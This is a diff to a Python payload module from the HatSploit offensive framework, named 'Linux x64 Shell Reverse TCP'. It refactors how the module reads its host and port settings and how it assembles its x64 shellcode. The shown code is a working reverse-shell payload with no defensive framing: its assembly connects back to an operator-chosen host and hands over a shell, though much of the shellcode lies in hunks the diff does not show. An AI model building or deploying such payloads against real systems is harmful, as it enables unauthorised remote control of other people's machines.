@@ -3,16 +3,18 @@ This payload requires HatSploit: https://hatsploit.com
 Current source: https://github.com/EntySec/HatSploit
 """
 
-from hatsploit.lib.payload import Payload
+from hatsploit.lib.payload.basic import *
+from hatsploit.lib.handler import Handler
+
 from pex.assembler import Assembler
 from pex.socket import Socket
 
 
-class HatSploitPayload(Payload, Assembler, Socket):
+class HatSploitPayload(Payload, Handler, Assembler, Socket):
     def __init__(self):
         super().__init__()
 
-        self.details = {
+        self.details.update({
             'Name': "Linux x64 Shell Reverse TCP",
             'Payload': "linux/x64/shell_reverse_tcp",
             'Authors': [
@@ -23,12 +25,13 @@ class HatSploitPayload(Payload, Assembler, Socket):
             'Platform': "linux",
             'Rank': "high",
             'Type': "reverse_tcp",
-        }
+        })
 
     def implant(self):
         return self.assemble(
             self.details['Architecture'],
             """
+            start:
                 push 0x3
                 pop rsi
 
@@ -53,8 +56,8 @@ class HatSploitPayload(Payload, Assembler, Socket):
         )
 
     def run(self):
-        host = self.pack_host(self.handler['RHOST'])
-        port = self.pack_port(self.handler['RPORT'])
+        host = self.pack_host(self.rhost.value)
+        port = self.pack_port(self.rport.value)
 
         return self.assemble(
             self.details['Architecture'],
@@ -78,7 +81,5 @@ class HatSploitPayload(Payload, Assembler, Socket):
                 push 0x2a
                 pop rax
                 syscall
-
-                {self.implant()}
             """
-        )
+        ) + self.implant()
